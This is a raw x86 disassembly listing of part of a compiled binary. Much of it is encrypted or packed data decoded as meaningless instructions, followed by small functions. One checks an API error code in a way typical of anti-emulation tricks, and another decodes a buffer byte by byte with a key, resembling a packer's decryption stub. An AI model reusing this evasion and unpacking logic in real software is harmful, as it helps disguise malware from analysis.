  41554b:	lds    ecx,FWORD PTR [esi]
  41554d:	xor    eax,0x6618e831
  415552:	lahf   
  415553:	pop    ds
  415554:	lea    edi,[ebx]
  415556:	(bad)  
  415557:	rol    ebx,cl
  415559:	call   0x3de21a11
  41555e:	fcomp  QWORD PTR [ebx+0x19]
  415561:	ret    0x9c1e
  415564:	xchg   bl,cl
  415566:	jbe    0x41550e
  415568:	sub    bl,BYTE PTR [edx]
  41556a:	add    edi,edx
  41556c:	or     eax,0xb6569c9c
  415571:	daa    
  415572:	sub    cl,BYTE PTR [ecx-0x54dfdf5]
  415578:	mov    esi,0xe17e7489
  41557d:	and    edx,DWORD PTR [ebx+eiz*8+0x21]
  415581:	jnp    0x41558a
  415583:	repz jp 0x415521
  415586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415587:	mov    ?,WORD PTR [ecx+0x469237b0]
  41558d:	mov    ebp,esi
  41558f:	jge    0x415541
  415591:	or     edx,DWORD PTR [edi]
  415593:	jnp    0x415550
  415595:	and    edi,DWORD PTR [edx]
  415597:	cmp    dl,BYTE PTR [edi+0x2103fb43]
  41559d:	addr16 ret 
  41559f:	xchg   ecx,eax
  4155a0:	test   al,0x6f
  4155a2:	iret   
  4155a3:	dec    esi
  4155a4:	ds scas al,BYTE PTR es:[edi]
  4155a6:	fwait
  4155a7:	int    0x9f
  4155a9:	ret    0xc4de
  4155ac:	adc    dh,BYTE PTR [ecx+eax*8]
  4155af:	fwait
  4155b0:	imul   edi,DWORD PTR [eax-0x6c491f75],0xe912f32d
  4155ba:	aas    
  4155bb:	out    0x46,eax
  4155bd:	push   0x22
  4155bf:	repz xor BYTE PTR [edi+edi*1-0x7b],ch
  4155c4:	pop    ss
  4155c5:	sete   cl
  4155c8:	popf   
  4155c9:	subps  xmm6,XMMWORD PTR [ebp-0x6a]
  4155cd:	stos   BYTE PTR es:[edi],al
  4155ce:	adc    BYTE PTR [ecx],bl
  4155d0:	imul   esi,esi,0xe44a888f
  4155d6:	(bad)  
  4155d7:	mov    ds:0x155e5d39,al
  4155dc:	stc    
  4155dd:	pop    ebx
  4155de:	cli    
  4155df:	lods   eax,DWORD PTR ds:[esi]
  4155e0:	add    ah,ah
  4155e2:	pop    es
  4155e3:	js     0x4155ca
  4155e5:	sub    BYTE PTR [esi+0xd],ah
  4155e8:	aas    
  4155e9:	push   cs
  4155ea:	sub    esi,DWORD PTR [edx+esi*2+0x1be9d113]
  4155f1:	push   ss
  4155f2:	inc    esp
  4155f3:	mov    al,ds:0x6ba7f8f9
  4155f8:	lods   al,BYTE PTR ds:[esi]
  4155f9:	add    DWORD PTR [edx+0x59e6df52],0x1c
  415600:	mov    al,0x61
  415602:	xchg   dx,ax
  415604:	xor    esi,DWORD PTR [edi]
  415606:	add    DWORD PTR [edi-0x5f4d7190],edx
  41560c:	leave  
  41560d:	stos   BYTE PTR es:[edi],al
  41560e:	(bad)  
  415610:	sbb    eax,0xd1036307
  415615:	lods   al,BYTE PTR ds:[esi]
  415616:	jnp    0x41568b
  415618:	cmc    
  415619:	fmul   QWORD PTR [ebp+eax*4-0x69]
  41561d:	add    DWORD PTR [edi-0x68ab8346],esp
  415623:	les    eax,FWORD PTR [eax-0xe]
  415626:	or     ebx,DWORD PTR [esi]
  415628:	mov    edx,0x4b72d585
  41562d:	jmp    0x4156a6
  41562f:	inc    ecx
  415630:	lods   al,BYTE PTR ds:[esi]
  415632:	(bad)  
  415633:	jne    0x415612
  415635:	xchg   esp,eax
  415636:	mov    al,0xd3
  415638:	hlt    
  415639:	mov    cl,0xfc
  41563b:	fwait
  41563c:	mov    eax,ds:0x91dc6cd2
  415641:	pop    ebx
  415642:	in     ax,0x5
  415645:	call   0x46babd8f
  41564a:	stc    
  41564b:	inc    esi
  41564c:	add    DWORD PTR [edx-0x6a9a07e7],esp
  415652:	sbb    bh,BYTE PTR [edi-0x68b4659c]
  415658:	popa   
  415659:	aaa    
  41565a:	inc    esi
  41565b:	jb     0x4155df
  41565d:	jne    0x415661
  41565f:	enter  0x47d,0xa0
  415663:	sub    BYTE PTR [ecx+0x57f401b9],ah
  415669:	add    bl,BYTE PTR [eax-0x19]
  41566c:	dec    esi
  41566d:	sub    al,0x1e
  41566f:	aad    0xa3
  415671:	mov    eax,ds:0x35661df5
  415676:	jp     0x4156c2
  415678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415679:	out    0x9d,al
  41567b:	lods   al,BYTE PTR ds:[esi]
  41567c:	mov    cl,BYTE PTR [eax]
  41567e:	mov    edi,0xadaffff0
  415683:	mov    ds:0xf7a19b67,eax
  415688:	jae    0x415622
  41568a:	cmc    
  41568b:	mov    cl,0x37
  41568d:	push   ecx
  41568e:	inc    ebx
  41568f:	dec    ecx
  415690:	pushf  
  415691:	ins    BYTE PTR es:[edi],dx
  415692:	out    dx,eax
  415693:	push   ebp
  415694:	add    edi,edi
  415696:	cmp    ah,dh
  415698:	inc    ebx
  415699:	add    eax,0xa3dfef77
  41569e:	pop    ebx
  41569f:	xor    al,0x51
  4156a1:	fiadd  WORD PTR [ecx-0xa]
  4156a4:	fs leave 
  4156a6:	popf   
  4156a7:	loopne 0x4156d5
  4156a9:	ror    BYTE PTR [ecx+0x62],cl
  4156ac:	mov    ch,0xd1
  4156ae:	hlt    
  4156af:	mov    esp,0x56ab3fce
  4156b4:	xchg   esi,eax
  4156b5:	push   0xfdff202f
  4156ba:	test   DWORD PTR [ebx],0x7c046aa6
  4156c0:	mov    edi,0x65e0989
  4156c5:	into   
  4156c6:	repnz push esp
  4156c8:	jecxz  0x41564b
  4156ca:	es pop eax
  4156cc:	or     BYTE PTR [edi+0x1f6015c8],dl
  4156d2:	lods   al,BYTE PTR ds:[esi]
  4156d3:	repz out 0x41,al
  4156d6:	pop    ebp
  4156d7:	jmp    0x93528821
  4156dc:	sbb    BYTE PTR [ecx+0x5d],dh
  4156df:	xchg   edx,eax
  4156e0:	es pop es
  4156e2:	das    
  4156e3:	add    eax,0x5b273bef
  4156e8:	push   es
  4156e9:	cmp    BYTE PTR [ecx+eiz*8-0x36],0xf8
  4156ee:	sbb    dh,BYTE PTR [ecx]
  4156f0:	and    eax,0x134ddfc2
  4156f5:	mov    bh,0x87
  4156f7:	xchg   BYTE PTR [esi-0x190b8467],dh
  4156fd:	ror    BYTE PTR [edi],1
  4156ff:	jns    0x4156e8
  415701:	loop   0x415696
  415703:	in     eax,0x5c
  415705:	mov    cs,WORD PTR [ecx]
  415707:	stos   DWORD PTR es:[edi],eax
  415708:	dec    edi
  415709:	jnp    0x4156f0
  41570b:	ins    DWORD PTR es:[edi],dx
  41570c:	push   es
  41570d:	mov    edx,0x92987715
  415712:	push   eax
  415713:	push   eax
  415714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415715:	pop    esp
  415716:	lea    eax,[edx+0x26]
  415719:	fidiv  WORD PTR [ebp+0x5b]
  41571c:	mov    dh,0xb7
  41571e:	dec    esi
  41571f:	xor    ebx,DWORD PTR [ecx-0x7f]
  415722:	ins    DWORD PTR es:[edi],dx
  415723:	mov    ebp,0x28904021
  415728:	push   es
  415729:	push   0xffffffde
  41572b:	sti    
  41572c:	jne    0x41579b
  41572e:	out    dx,eax
  41572f:	xor    DWORD PTR [ecx+0x7c34ba8d],esp
  415735:	aas    
  415736:	test   eax,0xfb16d07b
  41573b:	sbb    eax,0x432441c1
  415740:	ins    BYTE PTR es:[edi],dx
  415741:	or     DWORD PTR [esi],eax
  415743:	sub    ebx,esp
  415745:	ret    
  415746:	popf   
  415747:	xchg   ecx,eax
  415748:	push   ebx
  415749:	fdivrp st(3),st
  41574b:	push   ds
  41574c:	cmp    dl,BYTE PTR [ecx]
  41574e:	jns    0x415785
  415750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415751:	add    dh,ch
  415753:	(bad)  
  415755:	ror    DWORD PTR [ecx*8+0x53bb4274],1
  41575c:	mov    eax,0x1
  415761:	mov    esp,ebp
  415763:	pop    ebp
  415764:	ret    
  415765:	push   ebp
  415766:	mov    ebp,esp
  415768:	pop    ebp
  415769:	ret    
  41576a:	push   ebp
  41576b:	mov    ebp,esp
  41576d:	sub    esp,0x3c
  415770:	push   esi
  415771:	mov    DWORD PTR [ebp-0x3c],0x0
  415778:	mov    DWORD PTR [ebp-0x38],0x0
  41577f:	mov    DWORD PTR [ebp-0x30],0x0
  415786:	mov    DWORD PTR [ebp-0x24],0x0
  41578d:	mov    DWORD PTR [ebp-0x1c],0x0
  415794:	mov    DWORD PTR [ebp-0x28],0x0
  41579b:	mov    DWORD PTR [ebp-0x2c],0x444654
  4157a2:	mov    DWORD PTR [ebp-0x24],0xc72d37f0
  4157a9:	mov    DWORD PTR [ebp-0x34],0x0
  4157b0:	mov    eax,DWORD PTR [ebp-0x24]
  4157b3:	mov    DWORD PTR [ebp-0x20],eax
  4157b6:	mov    DWORD PTR [ebp-0x4],0x0
  4157bd:	mov    ecx,DWORD PTR ds:0x416038
  4157c3:	mov    DWORD PTR [ebp-0x4],ecx
  4157c6:	push   0x0
  4157c8:	push   0x4e
  4157ca:	push   0x1e
  4157cc:	push   0x0
  4157ce:	push   0xffffffff
  4157d0:	call   DWORD PTR ds:0x416034
  4157d6:	mov    esi,DWORD PTR [ebp-0x4]
  4157d9:	call   esi
  4157db:	mov    DWORD PTR [ebp-0x38],eax
  4157de:	cmp    DWORD PTR [ebp-0x38],0x57
  4157e2:	jne    0x4157f0
  4157e4:	mov    edx,DWORD PTR [ebp-0x20]
  4157e7:	push   edx
  4157e8:	call   0x40249f
  4157ed:	add    esp,0x4
  4157f0:	xor    eax,eax
  4157f2:	pop    esi
  4157f3:	mov    esp,ebp
  4157f5:	pop    ebp
  4157f6:	ret    
  4157f7:	push   ebp
  4157f8:	mov    ebp,esp
  4157fa:	sub    esp,0x124
  415800:	xor    eax,eax
  415802:	mov    esp,ebp
  415804:	pop    ebp
  415805:	ret    
  415806:	push   ebp
  415807:	mov    ebp,esp
  415809:	sub    esp,0x2c
  41580c:	push   ebx
  41580d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  415814:	mov    DWORD PTR [ebp-0xc],0x0
  41581b:	mov    DWORD PTR [ebp-0x20],0x1
  415822:	mov    DWORD PTR [ebp-0x10],0x0
  415829:	mov    eax,DWORD PTR [ebp+0xc]
  41582c:	mov    DWORD PTR [ebp-0x1c],eax
  41582f:	mov    DWORD PTR [ebp-0x18],0x0
  415836:	mov    DWORD PTR [ebp-0x8],0x0
  41583d:	mov    DWORD PTR [ebp-0x24],0x0
  415844:	mov    ecx,DWORD PTR [ebp-0x4]
  415847:	sub    ecx,0x1
  41584a:	mov    DWORD PTR [ebp-0x4],ecx
  41584d:	mov    edx,DWORD PTR [ebp+0x8]
  415850:	mov    DWORD PTR [ebp-0x10],edx
  415853:	mov    DWORD PTR [ebp-0x28],0x1
  41585a:	mov    eax,DWORD PTR [ebp-0x4]
  41585d:	add    eax,0x2
  415860:	mov    DWORD PTR [ebp-0x4],eax
  415863:	mov    ecx,DWORD PTR [ebp-0x1c]
  415866:	add    ecx,DWORD PTR [ebp-0x4]
  415869:	mov    dl,BYTE PTR [ecx+0x1]
  41586c:	mov    BYTE PTR [ebp-0x11],dl
  41586f:	mov    eax,DWORD PTR [ebp-0x4]
  415872:	add    eax,0x1
  415875:	mov    DWORD PTR [ebp-0x4],eax
  415878:	mov    cl,BYTE PTR [ebp-0x11]
  41587b:	mov    BYTE PTR [ebp-0x29],cl
  41587e:	push   edx
  41587f:	pop    ebx
  415880:	mov    ecx,ebx
  415882:	mov    edx,DWORD PTR [ebp-0x10]
  415885:	add    edx,DWORD PTR [ebp-0x4]
  415888:	mov    al,BYTE PTR [ebp-0x29]
  41588b:	mov    BYTE PTR [edx],al
  41588d:	mov    ebx,esi
  41588f:	mov    ecx,DWORD PTR [ebp+0x14]
  415892:	add    ecx,DWORD PTR [ebp-0x8]
  415895:	movzx  edx,BYTE PTR [ecx]
  415898:	mov    DWORD PTR [ebp-0xc],edx
  41589b:	mov    eax,DWORD PTR [ebp-0x8]
  41589e:	mov    ecx,DWORD PTR [ebp-0x28]
  4158a1:	add    eax,ecx
  4158a3:	mov    DWORD PTR [ebp-0x8],eax
  4158a6:	mov    eax,DWORD PTR [ebp-0x8]
  4158a9:	shr    eax,0x3
  4158ac:	mov    ecx,0x1
  4158b1:	sub    ecx,eax
  4158b3:	mov    DWORD PTR [ebp-0x20],ecx
  4158b6:	shr    eax,cl
  4158b8:	mov    edx,DWORD PTR [ebp-0x8]
  4158bb:	imul   edx,DWORD PTR [ebp-0x20]
  4158bf:	mov    DWORD PTR [ebp-0x8],edx
  4158c2:	shl    ebx,0x3
  4158c5:	mov    eax,DWORD PTR [ebp-0x10]
  4158c8:	add    eax,DWORD PTR [ebp-0x4]
  4158cb:	movzx  ecx,BYTE PTR [eax]
  4158ce:	add    ecx,DWORD PTR [ebp-0xc]
  4158d1:	mov    edx,DWORD PTR [ebp-0x10]
  4158d4:	add    edx,DWORD PTR [ebp-0x4]
  4158d7:	mov    BYTE PTR [edx],cl
  4158d9:	mov    eax,DWORD PTR [ebp-0x4]
  4158dc:	sub    eax,0x2
  4158df:	mov    DWORD PTR [ebp-0x4],eax
  4158e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4158e5:	cmp    ecx,DWORD PTR [ebp+0x10]
  4158e8:	jl     0x41585a
  4158ee:	pop    ebx
  4158ef:	mov    esp,ebp
  4158f1:	pop    ebp
  4158f2:	ret    
  4158f3:	int3   
  4158f4:	jmp    DWORD PTR ds:0x416024
